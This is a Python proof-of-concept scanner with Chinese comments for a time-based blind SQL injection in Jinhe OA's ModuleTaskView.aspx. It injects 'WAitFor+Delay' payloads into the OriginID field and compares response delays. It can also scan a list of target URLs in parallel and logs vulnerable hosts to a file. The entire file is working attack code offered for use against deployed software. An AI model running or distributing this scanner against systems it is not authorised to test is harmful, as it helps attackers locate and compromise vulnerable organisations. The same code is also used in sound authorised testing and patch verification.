import argparse
import requests
import time
import warnings
from multiprocessing import Pool, Lock

# 忽略 SSL 证书警告
requests.packages.urllib3.disable_warnings()

# 全局初始化多进程锁，防止写文件冲突
file_lock = None

def init_pool(l):
    global file_lock
    file_lock = l

def write_to_file(content):
    """多进程安全写入文件的辅助函数"""
    if file_lock:
        file_lock.acquire()
    try:
        with open("vuln.txt", "a", encoding="utf-8") as f:
            f.write(f"{content}\n")
    finally:
        if file_lock:
            file_lock.release()

def banner():
    banner = r"""
     __.__       .__            
    |__|__| ____ |  |__   ____  
    |  |  |/    \|  |  \_/ __ \ 
    |  |  |   |  \   Y  \  ___/ 
/\__|  |__|___|  /___|  /\___  >
\______|       \/     \/     \/                                      
            author:toward-duck
            version:1.0.1
"""
    print(banner)

def poc(url):
    url = url.strip().rstrip("/")
    if not url.startswith("http"):
        url = "http://" + url

    # 金和OA 目标路径
    target_url = f"{url}/c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # 基础 POST 数据模版
    base_data = {
        "_ListPage1LockNumber": "1",
        "_ListPage1RecordCount": "0",
        "__VIEWSTATE": "xxxxx",
        "__VIEWSTATEGENERATOR": "09BBB40C",
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": "",
        "OriginModule": "crmexec",
    }

    try:
        # === 1. 第一次请求：测试基准延时（1秒） ===
        data_1s = base_data.copy()
        data_1s["OriginID"] = "'WAitFor+Delay'0:0:1'--"
        
        start_1 = time.time()
        # 这里给 5 秒超时，如果网站打不开会在这里直接抛出异常跳到外层 except
        requests.post(target_url, headers=headers, data=data_1s, timeout=5, verify=False, allow_redirects=False)
        time_1s = time.time() - start_1

        # === 2. 第二次请求：测试目标延时（5秒） ===
        data_5s = base_data.copy()
        data_5s["OriginID"] = "'WAitFor+Delay'0:0:5'--"
        
        start_5 = time.time()
        try:
            requests.post(target_url, headers=headers, data=data_5s, timeout=10, verify=False, allow_redirects=False)
            time_5s = time.time() - start_5

            # === 3. 核心差分逻辑判断 ===
            time_difference = time_5s - time_1s

            # 理论差值为 4 秒。留出弹性空间（2.5s ~ 5.5s）
            if 2.5 <= time_difference <= 5.5:
                msg = f"[+] {url} 确定存在SQL注入漏洞！(1s耗时: {time_1s:.2f}s, 5s耗时: {time_5s:.2f}s)"
                print(msg)
                write_to_file(msg)
            else:
                print(f"[-] {url} 未触发规律延时 (无漏洞，时间差: {time_difference:.2f}s)")

        except requests.Timeout:
            # 只有当 1 秒请求成功了，5 秒请求却触发了超时，这才叫注入导致的挂起
            msg = f"[?] {url} 触发强力延时导致超时 (极高概率存在漏洞！)"
            print(msg)
            write_to_file(msg)

    except requests.Timeout:
        # 第一次请求就超时，说明是网站本身的死链、墙外IP或关机
        print(f"[!] {url} 请求超时 (网站本身无法访问/死链)")
    except requests.RequestException:
        # 拒绝访问、404、DNS 解析错误等
        print(f"[!] {url} 连接失败 (拒绝访问或服务未开启)")

def main():
    banner()
    parser = argparse.ArgumentParser(description="金和OA ModuleTaskView.aspx 全状态盲注检测工具")
    parser.add_argument("-u", "--url", help="单个URL进行检测")
    parser.add_argument("-f", "--file", help="包含多个URL的文件，每行一个URL")
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        try:
            with open(args.file, "r", encoding="utf-8") as f:
                urls = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"[!] 找不到文件: {args.file}")
            return

        if urls:
            print(f"[*] 开始批量检测，总计目标数: {len(urls)}")
            print("-" * 60)
            
            lock = Lock()
            with Pool(processes=5, initializer=init_pool, initargs=(lock,)) as pool:
                pool.map(poc, urls)
                
            print("-" * 60)
            print("[*] 检测扫描完成！真正高危的目标已保存至 vuln.txt")
    else:
        print("请提供一个URL或一个包含URL的文件。使用 -h 查看帮助。")

if __name__ == "__main__":
    main()